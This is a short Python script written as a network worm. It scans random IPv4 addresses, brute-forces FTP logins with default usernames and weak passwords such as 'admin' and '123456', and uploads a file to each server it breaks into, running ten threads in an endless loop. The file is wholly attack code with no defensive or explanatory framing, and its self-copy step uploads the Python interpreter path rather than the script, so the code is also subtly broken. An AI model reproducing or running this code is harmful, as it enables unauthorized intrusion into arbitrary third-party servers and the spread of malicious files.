import ftplib
import random
import socket
import sys
import threading

def get_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def try_ftp_login(ip, username, password):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login(username, password)
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(f"[!] Error connecting to {ip}: {e}")
        return False

def spread():
    usernames = ["admin", "root", "user", "guest"]
    passwords = ["password", "123456", "admin", "root"]

    while True:
        try:
            ip = get_random_ip()
            for username in usernames:
                for password in passwords:
                    if try_ftp_login(ip, username, password):
                        print(f"[+] Connected to {ip} with {username}:{password}")
                        ftp = ftplib.FTP(ip)
                        ftp.login(username, password)
                        with open(sys.executable, "rb") as file:
                            ftp.storbinary(f"STOR {sys.executable}", file)
                        ftp.quit()
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    threads = []
    for _ in range(10):
        try:
            thread = threading.Thread(target=spread)
            thread.start()
            threads.append(thread)
        except Exception as e:
            print(f"[!] Error creating thread: {e}")

    for thread in threads:
        try:
            thread.join()
        except Exception as e:
            print(f"[!] Error joining thread: {e}")

if __name__ == "__main__":
    main()
